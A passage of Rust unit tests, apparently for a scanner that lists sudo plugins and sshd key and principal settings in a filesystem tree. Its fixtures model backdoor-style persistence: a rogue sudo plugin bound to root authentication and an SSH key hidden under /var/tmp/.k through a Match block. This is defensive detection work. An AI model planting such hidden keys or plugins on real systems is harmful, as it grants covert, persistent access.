        assert_eq!((evil.trigger, evil.principal.as_deref()), (Trigger::Auth, Some("root")));
        assert_eq!(evil.raw["options"], "extra=1");
        // sudo concatenates: no slash is added.
        let rel = named(&s, "Plugin sudoers_io rel.so").pop().unwrap();
        assert_eq!(rel.target_path, Some(PathBuf::from("/opt/prel.so")));
        std::fs::remove_dir_all(&d).unwrap();

        // A moved plugin_dir alone changes where the default policy loads.
        let d = tree("sudoconf-dir");
        put(&d, "etc/sudo.conf", "Path plugin_dir /opt/plugins/\n");
        let s = scan(&d);
        let default = named(&s, "default policy sudoers.so").pop().unwrap();
        assert_eq!(default.target_path, Some(PathBuf::from("/opt/plugins/sudoers.so")));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sshd_reads_the_key_files_authorized_keys_file_names() {
        let d = tree("keyfiles");
        put(&d, "etc/passwd", "root:x:0:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/sh\nbob:x:1001:1001::/home/bob:/bin/sh\n");
        std::fs::create_dir_all(d.join("home/bob")).unwrap();
        put(
            &d,
            "etc/ssh/sshd_config",
            "AuthorizedKeysFile /etc/ssh/keys/%u .ssh/authorized_keys\n\
             AuthorizedKeysFile /ignored/%u\n\
             TrustedUserCAKeys /etc/ssh/user_ca.pub\n\
             AuthorizedPrincipalsCommand /usr/local/bin/principals %u\n\
             Match User bob\n\
             \tAuthorizedKeysFile /var/tmp/.k/%U\n",
        );
        let key = |c: &str| format!("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl {c}\n");
        put(&d, "etc/ssh/keys/alice", key("central"));
        put(&d, "home/alice/.ssh/authorized_keys", key("home"));
        put(&d, "home/alice/.ssh/authorized_keys2", key("stale"));
        put(&d, "var/tmp/.k/1001", key("hidden"));
        put(&d, "var/tmp/.k/1000", key("not-alices"));
        put(&d, "ignored/alice", key("second-value"));
        let s = scan(&d);
        let by_comment = |c: &str| s.entries.iter().filter(|e| e.raw.get("comment").map(String::as_str) == Some(c)).collect::<Vec<_>>();

        let central = by_comment("central");
        assert_eq!((central.len(), central[0].enabled), (1, Enablement::Enabled), "%u expanded, absolute path read");
        assert_eq!(central[0].principal.as_deref(), Some("alice"));
        assert_eq!(by_comment("home")[0].enabled, Enablement::Enabled, "a relative path is taken from the home");
        let stale = by_comment("stale");
        assert_eq!(stale[0].enabled, Enablement::Disabled, "a default file the configuration no longer names");
        assert_eq!(stale[0].raw["not_read"], "AuthorizedKeysFile names other files");
        let hidden = by_comment("hidden");
        assert_eq!((hidden.len(), hidden[0].principal.as_deref()), (1, Some("bob")), "%U and the Match block");
        assert_eq!(hidden[0].raw["match"], "User bob");
        assert!(by_comment("not-alices").is_empty(), "the Match block is bob's alone");
        assert!(by_comment("second-value").is_empty(), "sshd takes the first value");
        assert_eq!(named(&s, "AuthorizedKeysFile").iter().filter(|e| e.enabled == Enablement::Disabled).count(), 1);

        let ca = named(&s, "TrustedUserCAKeys").pop().unwrap();
        assert_eq!(ca.target_path, Some(PathBuf::from("/etc/ssh/user_ca.pub")));
        let apc = named(&s, "AuthorizedPrincipalsCommand").pop().unwrap();
        assert_eq!(apc.command.as_deref(), Some(b"/usr/local/bin/principals %u".as_slice()));
        std::fs::remove_dir_all(&d).unwrap();
    }
}
